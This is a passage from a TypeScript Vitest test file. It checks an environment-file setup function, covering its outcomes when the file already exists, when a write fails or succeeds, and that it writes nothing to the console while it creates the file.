			expect(await setupStackEnv(stack(), nodeSetupDeps(counter()))).toBe("already_set_up");
			expect(await readFile(path.join(dir, "elsewhere"), "utf8")).toBe("untouched");
		});

		it("reports a failed write without throwing, and returns only an outcome word", async () => {
			const failing: SetupDeps = { randomBytes: counter(), createFile: async () => { throw Object.assign(new Error("EROFS"), { code: "EROFS" }); } };
			expect(await setupStackEnv(stack(), failing)).toBe("failed");
			const created: SetupDeps = { randomBytes: counter(), createFile: async () => undefined };
			expect(await setupStackEnv(stack(), created)).toBe("created");
		});

		it("logs nothing while creating the file", async () => {
			const spies = (["log", "info", "warn", "error", "debug"] as const).map((name) => vi.spyOn(console, name).mockImplementation(() => undefined));
			try {
				await setupStackEnv(stack(), nodeSetupDeps(counter()));
				for (const spy of spies) expect(spy).not.toHaveBeenCalled();
			} finally {
				for (const spy of spies) spy.mockRestore();
			}
		});
	});
});
